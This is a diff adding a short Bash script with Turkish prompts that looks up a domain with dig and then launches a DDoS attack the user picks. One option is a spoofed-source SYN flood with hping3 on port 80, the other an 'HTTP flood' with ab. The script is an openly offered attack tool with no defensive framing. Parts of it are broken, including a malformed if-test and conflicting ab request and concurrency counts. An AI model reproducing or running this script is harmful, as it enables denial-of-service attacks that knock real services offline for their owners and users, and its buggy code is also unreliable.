@@ -1,0 +1,21 @@
+#!/bin/bash
+
+echo "ip veya alan ismi hakkında bilgi almak için ip veya alan isimini girin.."
+ read domain
+ dig $domain 
+echo "Yapacağınız DDOS saldırı türünü seçin"
+echo  " synflood(1) "
+echo  " httpflood(2) " 
+ read secim
+ if [secim -eq 1]
+then
+ echo "Syn flood başlatmak için alan ip girin"
+  read ip
+  hping3 $ip -p 80 -S --rand-source 
+else 
+echo "Http flood saldırısı için ip girin"
+ read ip2
+ echo "İstek sayısını girin"
+ read istek_sayi
+ ab -n 10 -c $istek_sayi http://$ip2/
+fi
